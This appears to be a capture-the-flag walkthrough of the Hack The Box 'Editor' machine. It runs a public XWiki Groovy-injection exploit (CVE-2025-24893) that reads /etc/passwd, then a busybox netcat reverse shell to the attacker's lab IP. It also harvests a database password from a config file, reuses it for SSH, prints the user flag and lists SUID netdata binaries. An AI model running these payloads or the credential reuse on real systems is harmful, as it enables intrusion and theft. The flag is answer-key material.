---
title: "Editor"
date: 2025-09-09
slug: "editor"
tags: ["Unrated", "HTB", "Unknown-OS"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
cover: "/images/editor/Pasted image 20250809212504.png"
summary: "Walkthrough of the Editor HTB machine covering recon, exploitation, and privilege escalation."
---
Machine level easy

## Recon

```zsh
nmap 10.129.159.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 21:13 EEST
Nmap scan report for 10.129.159.148
Host is up (1.7s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds

```

add the machine to /etc/hosts

Then further nmap

```zsh
nmap -sV -p 22,80,8080 -sC 10.129.159.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 21:20 EEST
Nmap scan report for editor.htb (10.129.159.148)
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds

```

## Enumeration

![editor-1](/images/editor/Pasted image 20250809212504.png)

Will check the deb package

```zsh
 dpkg -x simplistcode_1.0.deb simplistcode 
```

```zsh
[~/…/simplistcode/usr/local/bin]
└─$ ./simplistcode
```

![editor-2](/images/editor/Pasted image 20250809213146.png)

looks like a normal application

I think our entry is from port 8080

Under "http://editor.htb:8080/robots.txt"

```HTML
User-agent: *
# Prevent bots from executing all actions except "view" and
# "download" since:
# 1) we don't want bots to execute stuff in the wiki by
#    following links! (for example delete pages, add comments,
#    etc)
# 2) we don't want bots to consume CPU and memory
#   (for example to perform exports)
Disallow: /xwiki/bin/viewattachrev/
Disallow: /xwiki/bin/viewrev/
Disallow: /xwiki/bin/pdf/
Disallow: /xwiki/bin/edit/
Disallow: /xwiki/bin/create/
Disallow: /xwiki/bin/inline/
Disallow: /xwiki/bin/preview/
Disallow: /xwiki/bin/save/
Disallow: /xwiki/bin/saveandcontinue/
Disallow: /xwiki/bin/rollback/
Disallow: /xwiki/bin/deleteversions/
Disallow: /xwiki/bin/cancel/
Disallow: /xwiki/bin/delete/
Disallow: /xwiki/bin/deletespace/
Disallow: /xwiki/bin/undelete/
Disallow: /xwiki/bin/reset/
Disallow: /xwiki/bin/register/
Disallow: /xwiki/bin/propupdate/
Disallow: /xwiki/bin/propadd/
Disallow: /xwiki/bin/propdisable/
Disallow: /xwiki/bin/propenable/
Disallow: /xwiki/bin/propdelete/
Disallow: /xwiki/bin/objectadd/
Disallow: /xwiki/bin/commentadd/
Disallow: /xwiki/bin/commentsave/
Disallow: /xwiki/bin/objectsync/
Disallow: /xwiki/bin/objectremove/
Disallow: /xwiki/bin/attach/
Disallow: /xwiki/bin/upload/
Disallow: /xwiki/bin/temp/
Disallow: /xwiki/bin/downloadrev/
Disallow: /xwiki/bin/dot/
Disallow: /xwiki/bin/delattachment/
Disallow: /xwiki/bin/skin/
Disallow: /xwiki/bin/jsx/
Disallow: /xwiki/bin/ssx/
Disallow: /xwiki/bin/login/
Disallow: /xwiki/bin/loginsubmit/
Disallow: /xwiki/bin/loginerror/
Disallow: /xwiki/bin/logout/
Disallow: /xwiki/bin/lock/
Disallow: /xwiki/bin/redirect/
Disallow: /xwiki/bin/admin/
Disallow: /xwiki/bin/export/
Disallow: /xwiki/bin/import/
Disallow: /xwiki/bin/get/
Disallow: /xwiki/bin/distribution/
Disallow: /xwiki/bin/jcaptcha/
Disallow: /xwiki/bin/unknown/
Disallow: /xwiki/bin/webjars/
```

Found a login page under xwiki/bin/login/ after being redirected from several links:

![editor-3](/images/editor/Pasted image 20250809213912.png)

Found this exploit for XWiki 15.10.10 and below:

https://www.exploit-db.com/exploits/52136

and I will try it:

```zsh
python test.py
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): editor.htb:8080/xwiki
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://editor.htb:8080/xwiki
[+] Sending request to: http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✔] Exploit successful! Output received:
<p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;rss xmlns:dc="<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://purl.org/dc/elements/1.1/"><span class="wikigeneratedlinkcontent">http://purl.org/dc/elements/1.1/</span></a></span>" version="2.0"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin<br/>systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin<br/>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br/>systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin<br/>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br/>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br/>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br/>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br/>tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false<br/>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br/>fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin<br/>usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin<br/>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br/>dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin<br/>mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false<br/>tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin<br/>xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin<br/>netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin<br/>oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash<br/>_laurel:x:995:995::/var/log/laurel:/bin/false</sub>]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"><span class="wikigeneratedlinkcontent">http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin<br/>systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin<br/>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br/>systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin<br/>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br/>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br/>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br/>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br/>tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false<br/>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br/>fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin<br/>usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin<br/>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br/>dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin<br/>mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false<br/>tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin<br/>xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin<br/>netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin<br/>oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash<br/>_laurel:x:995:995::/var/log/laurel:/bin/false</sub>]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright /&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights /&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div class="wikimodel-emptyline"></div><div class="wikimodel-emptyline"></div>

```

I will modify the code to open a reverse shell:

No need I just found a way better POC: https://github.com/nopgadget/CVE-2025-24893/tree/main

```zsh
 python test3.py http://editor.htb:8080 -i 10.10.16.38 -p 4445 --no-test
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made by nopgadget
Based on the original script by Al Baradi Joy
Self-Contained Reverse Shell Version
================================================================================
[!] Target URL: editor.htb:8080
[!] Callback IP: 10.10.16.38
[!] Callback Port: 4445
[!] Max Reconnections: 5
[!] Skipping test, going straight to reverse shell...
[+] Starting listener on 10.10.16.38:4445
[+] Trying to bind to 10.10.16.38 on port 4445: Done
[+] Waiting for connections on 10.10.16.38:4445: Got connection from 10.129.159.148 on port 41768
[✔] Listener started successfully on 10.10.16.38:4445
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://editor.htb:8080
[+] Using payload: busybox nc 10.10.16.38 4445 -e /bin/sh
[+] Sending reverse shell payload to: http://editor.htb:8080
[✔] Exploit payload sent successfully!
[+] Response status: 200
[+] Response length: 1612
[✔] Waiting for reverse shell connection...
[✔] Reverse shell connected!
[+] Interactive shell ready. Type 'exit' to quit.
[+] If connection drops, the shell will automatically reconnect.
[*] Switching to interactive mode
$ whoami
xwiki
$  

```

```zsh
$     basename $(readlink /proc/$$/exe)
dash
$ uname -m
x86_64

```

Unfortunately we are in a docker environment:

```zsh
$ env
USER=xwiki
SHLVL=0
HOME=/var/lib/xwiki
OLDPWD=/var/lib/xwiki
SYSTEMD_EXEC_PID=1125
LOGNAME=xwiki
JOURNAL_STREAM=8:23711
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=2b8779dcc95b4277806074cdc5093b65
LANG=en_US.UTF-8
PWD=/usr/lib/xwiki-jetty

```

I cheated a little because I was not able to download anything within the shell eventhough I have perfect internet connectivity

```shell
$ cat /etc/xwiki/hibernate.cfg.xml
<?xml version="1.0" encoding="UTF-8"?>

<!--
 * See the NOTICE file distributed with this work for additional
 * information regarding copyright ownership.
 *
 * This is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2.1 of
 * the License, or (at your option) any later version.
 *
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this software; if not, write to the Free
 * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 * 02110-1301 USA, or see the FSF site: http://www.fsf.org.
-->

<!DOCTYPE hibernate-configuration PUBLIC
  "-//Hibernate/Hibernate Configuration DTD//EN"
  "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd">
<hibernate-configuration>
  <session-factory>

    <!-- Please refer to the installation guide on
         https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Installation/ for configuring your database.
         You'll need to do 2 things:
         1) Copy your database driver JAR in WEB-INF/lib or in some shared lib directory
         2) Uncomment the properties below for your specific DB (and comment the default
            database configuration if it doesn't match your DB)
    -->

    <!-- Generic parameters common to all Databases -->

    <property name="hibernate.show_sql">false</property>
    <property name="hibernate.use_outer_join">true</property>

    <!-- Without it, some queries fail in MS SQL. XWiki doesn't need scrollable result sets, anyway. -->
    <property name="hibernate.jdbc.use_scrollable_resultset">false</property>

    <!-- DBCP Connection Pooling configuration. Only some properties are shown. All available properties can be found
         at https://commons.apache.org/proper/commons-dbcp/configuration.html
    -->
    <property name="hibernate.dbcp.defaultAutoCommit">false</property>
    <property name="hibernate.dbcp.maxTotal">50</property>
    <property name="hibernate.dbcp.maxIdle">5</property>
    <property name="hibernate.dbcp.maxWaitMillis">30000</property>

    <!-- Enable JMX monitoring for DBCP -->
    <property name="hibernate.dbcp.jmxName">org.apache.dbcp:DataSource=dbcp</property>

    <!-- Tell Hibernate to use XWiki's custom DBCP Connection Provider so that the DBCP pool is used -->
    <property name="hibernate.connection.provider_class">com.xpn.xwiki.store.DBCPConnectionProvider</property>

    <!--
      Keep the old behavior. The new version of hibernate tries to delete and recreate unique
      constraints when updating the database schema. The problem is that an exception is thrown
      when the constraint to be deleted does not exists, which is the case with a new XWiki
      instance.
      See https://hibernate.atlassian.net/browse/HHH-8162
    -->
    <property name="hibernate.schema_update.unique_constraint_strategy">skip</property>

    <!-- Setting "hibernate.dbcp.poolPreparedStatements" to true and "hibernate.dbcp.maxOpenPreparedStatements" will
         tell DBCP to cache Prepared Statements (it's off by default). Note that for backward compatibility the
         "hibernate.dbcp.ps.maxActive" is also supported and when set it'll set "hibernate.dbcp.poolPreparedStatements"
         to true and "hibernate.dbcp.maxOpenPreparedStatements" to value of "hibernate.dbcp.ps.maxActive".

         Note 1: When using HSQLDB for example, it's important to NOT cache prepared statements because HSQLDB
         Prepared Statements (PS) contain the schema on which they were initially created and thus when switching
         schema if the same PS is reused it'll execute on the wrong schema! Since HSQLDB does internally cache
         prepared statement there's no performance loss by not caching Prepared Statements at the DBCP level.
         See https://jira.xwiki.org/browse/XWIKI-1740.
         Thus we recommend not turning on this configuration for HSQLDB unless you know what you're doing :)

         Note 2: The same applies to PostGreSQL.
    -->

    <!-- BoneCP Connection Pooling configuration.
    <property name="hibernate.bonecp.idleMaxAgeInMinutes">240</property>
    <property name="hibernate.bonecp.idleConnectionTestPeriodInMinutes">60</property>
    <property name="hibernate.bonecp.partitionCount">3</property>
    <property name="hibernate.bonecp.acquireIncrement">10</property>
    <property name="hibernate.bonecp.maxConnectionsPerPartition">60</property>
    <property name="hibernate.bonecp.minConnectionsPerPartition">20</property>
    <property name="hibernate.bonecp.statementsCacheSize">50</property>
    <property name="hibernate.bonecp.releaseHelperThreads">3</property>
    <property name="hibernate.connection.provider_class">com.xpn.xwiki.store.DBCPConnectionProvider</property>
    -->

    <!-- Configuration for the default database.
         Comment out this section and uncomment other sections below if you want to use another database.
         Note that the database tables will be created automatically if they don't already exist.

         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
         engines) you will also have to set the property xwiki.db in xwiki.cfg file
    -->
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>

    <!-- MySQL configuration.
         Uncomment if you want to use MySQL and comment out other database configurations.
         Notes:
           - if you want the main wiki database to be different than "xwiki"
             you will also have to set the property xwiki.db in xwiki.cfg file
           - if you're using a MySQL 8+ JDBC driver, you don't need the "hibernate.connection.driver_class" which will
             generate a warning since it's not needed as the driver is registered automatically

    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>
    -->

    <!-- MariaDB configuration.
         Uncomment if you want to use MariaDB and comment out other database configurations.
         Notes:
           - if you want the main wiki database to be different than "xwiki"
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:mariadb://localhost/xwiki?useSSL=false</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.driver_class">org.mariadb.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>
    -->

    <!-- HSQLDB configuration.
         Uncomment if you want to use HSQLDB and comment out other database configurations.
         Notes:
           - if you want the main wiki schema to be different than "PUBLIC" (the default HSQLDB schema)
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:hsqldb:file:${environment.permanentDirectory}/database/xwiki_db;shutdown=true</property>
    <property name="hibernate.connection.username">sa</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.driver_class">org.hsqldb.jdbcDriver</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>
    -->

    <!-- PostgreSQL configuration.
         Uncomment if you want to use PostgreSQL and comment out other database configurations.
         Notes:
           - "hibernate.jdbc.use_streams_for_binary" needs to be set to "false",
             see https://community.jboss.org/wiki/HibernateCoreMigrationGuide36
           - "xwiki.virtual_mode" can be set to either "schema" or "database". Note that currently the database mode
             doesn't support database creation (see https://jira.xwiki.org/browse/XWIKI-8753)
           - if you want the main wiki database to be different than "xwiki" (or "public" in schema mode)
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:postgresql://localhost:5432/xwiki</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.driver_class">org.postgresql.Driver</property>
    <property name="hibernate.jdbc.use_streams_for_binary">false</property>
    <property name="xwiki.virtual_mode">schema</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.postgresql.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>
    -->

    <!-- Oracle configuration.
         Uncomment if you want to use Oracle and comment out other database configurations.
         Notes:
           - the 2 properties named "hibernate.connection.SetBigStringTryClob" and
             "hibernate.jdbc.batch_size" are required to tell Oracle to allow CLOBs larger than 32K.
           - "hibernate.jdbc.use_streams_for_binary" needs to be set to "false",
             see https://community.jboss.org/wiki/HibernateCoreMigrationGuide36
           - if you want the main wiki schema to be different than "xwiki"
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:oracle:thin:@localhost:1521:XE</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.driver_class">oracle.jdbc.driver.OracleDriver</property>
    <property name="hibernate.connection.SetBigStringTryClob">true</property>
    <property name="hibernate.jdbc.batch_size">0</property>
    <property name="hibernate.jdbc.use_streams_for_binary">false</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.oracle.hbm.xml"/>
    <mapping resource="feeds.oracle.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.oracle.hbm.xml"/>
    -->

    <!-- Derby configuration.
         Uncomment if you want to use Derby and comment out other database configurations.
         Notes:
           - if you want the main wiki schema to be different than "APP" (the default Derby schema)
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:derby:/some/path/xwikidb;create=true</property>
    <property name="hibernate.connection.driver_class">org.apache.derby.jdbc.EmbeddedDriver</property>
    <property name="hibernate.dialect">org.hibernate.dialect.DerbyDialect</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.derby.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    -->

    <!-- H2 configuration.
         Uncomment if you want to use H2 and comment out other database configurations.
         Notes:
           - if you want the main wiki schema to be different than "PUBLIC" (the default H2 schema)
             you will also have to set the property xwiki.db in xwiki.cfg file

    <property name="hibernate.connection.url">jdbc:h2:${environment.permanentDirectory}/database/xwiki</property>
    <property name="hibernate.connection.username">sa</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.driver_class">org.h2.Driver</property>
    <property name="hibernate.dialect">org.hibernate.dialect.H2Dialect</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    -->

  </session-factory>
</hibernate-configuration>

```

tried oliver:theEd1t0rTeam99 for ssh and it worked

```shell
oliver@editor:~$ cat user.txt
1cea6574c5e1ba1e6e75738450b5b2fb
oliver@editor:~$ 

```

Now run linpeas and see how we can escalate our privileges

I found this interesting:

```shell
-rwsr-x--- 1 root netdata 943K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network (Unknown SUID binary!)                                                                                                                
-rwsr-x--- 1 root netdata 1.4M Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin (Unknown SUID binary!)
-rwsr-x--- 1 root netdata 1.1M Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners (Unknown SUID binary!)
-rwsr-x--- 1 root netdata 196K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo (Unknown SUID binary!)
-rwsr-x--- 1 root netdata 80K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping (Unknown SUID binary!)
-rwsr-x--- 1 root netdata 876K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin (Unknown SUID binary!)
-rwsr-x--- 1 root netdata 4.1M Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin (Unknown SUID binary!)

```

